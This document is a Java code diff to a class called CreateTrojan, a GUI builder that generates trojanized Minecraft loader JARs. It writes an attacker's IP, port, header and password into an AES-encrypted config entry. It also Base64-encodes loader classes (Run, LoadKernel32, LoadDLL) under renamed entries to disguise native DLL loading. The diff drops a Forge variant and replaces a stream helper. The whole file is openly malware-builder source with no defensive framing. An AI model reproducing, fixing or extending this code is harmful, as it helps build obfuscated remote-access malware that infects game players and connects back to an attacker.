@@ -7,10 +7,7 @@ import sun.misc.IOUtils;
 
 import javax.swing.*;
 import java.awt.*;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.Enumeration;
@@ -22,12 +19,10 @@ public class CreateTrojan extends JDialog{
     public CreateTrojan(JFrame frame) {
         super(frame,"生成小马",false);
         InputStream inputStream = CreateTrojan.class.getClassLoader().getResourceAsStream("me/server/jar/Loader.jar");
-        InputStream inputStream1 = CreateTrojan.class.getClassLoader().getResourceAsStream("me/server/jar/ForgeLoader.jar");
         JTextField textField = new JTextField(25);
         JTextField textField1 = new JTextField(7);
         JComboBox<String> comboBox = new JComboBox<>();
         comboBox.addItem("正常启动");
-        comboBox.addItem("forge启动(支持全版本)");
         setResizable(false);
         JPanel panel1 = new JPanel();
         JPanel panel2 = new JPanel();
@@ -83,25 +78,22 @@ public class CreateTrojan extends JDialog{
                             fileOutputStream.close();
                             file.delete();
                             break;
-                        case 1:
-                            String IPAndPort1 = "IP:" + textField.getText() + "|" + "Port:" + textField1.getText() + "|" + "Head:" + Server.head+ "|" + "password:" + Server.password;
-                            file.createNewFile();
-                            FileOutputStream fileOutputStream1 = new FileOutputStream(file);
-                            while ((len = inputStream1.read(bytes))!=-1) {
-                                fileOutputStream1.write(bytes,0,len);
-                            }
-                            writeFile(new String(AESUtils.encryption(IPAndPort1)),"assets/minecraft/liquidbounce/Data.cfg","ForgeLoader.jar");
-                            JOptionPane.showMessageDialog(null,"ForgeLoader.jar生成成功!","生成小马",JOptionPane.INFORMATION_MESSAGE);
-                            dispose();
-                            fileOutputStream1.close();
-                            file.delete();
-                            break;
                     }
                 }
             }catch (Exception e) {
                 e.printStackTrace();
             }
         });
+    }
+    private static byte[] readInputStream(InputStream in) {
+        byte[] bytes = null;
+        try {
+            DataInputStream dataInputStream = new DataInputStream(in);
+            bytes = new byte[dataInputStream.available()];
+            dataInputStream.readFully(bytes);
+        } catch (Exception e) {
+        }
+        return bytes;
     }
     public static void writeFile(String s,String jarPath,String jarName) {
         try (
@@ -114,21 +106,21 @@ public class CreateTrojan extends JDialog{
                     if (jarPath.equals(entry.getName())) {
                         jos.putNextEntry(new JarEntry(entry.getName()));
                         jos.write(s.getBytes(StandardCharsets.UTF_8));
-                    }else if(entry.getName().equals("Loader1.class")) {
-                        jos.putNextEntry(new JarEntry("Loader1.class_"));
-                        byte[] bytes = Base64.getEncoder().encode(IOUtils.readNBytes(is, is.available()));
+                    }else if(entry.getName().equals("Run.class")) {
+                        jos.putNextEntry(new JarEntry("Run.class_"));
+                        byte[] bytes = Base64.getEncoder().encode(readInputStream(is));
                         jos.write(bytes);
                     }else if(entry.getName().equals("LoadKernel32.class")) {
                         jos.putNextEntry(new JarEntry("LoadKernel32.class_"));
-                        byte[] bytes = Base64.getEncoder().encode(IOUtils.readNBytes(is, is.available()));
+                        byte[] bytes = Base64.getEncoder().encode(readInputStream(is));
                         jos.write(bytes);
                     }else if(entry.getName().equals("LoadDLL.class")){
                         jos.putNextEntry(new JarEntry("LoadDLL.class_"));
-                        byte[] bytes = Base64.getEncoder().encode(IOUtils.readNBytes(is, is.available()));
+                        byte[] bytes = Base64.getEncoder().encode(readInputStream(is));
                         jos.write(bytes);
                     } else {
                         jos.putNextEntry(new JarEntry(entry.getName()));
-                        jos.write(IOUtils.readNBytes(is, is.available()));
+                        jos.write(readInputStream(is));
                     }
                     jos.closeEntry();
                 }
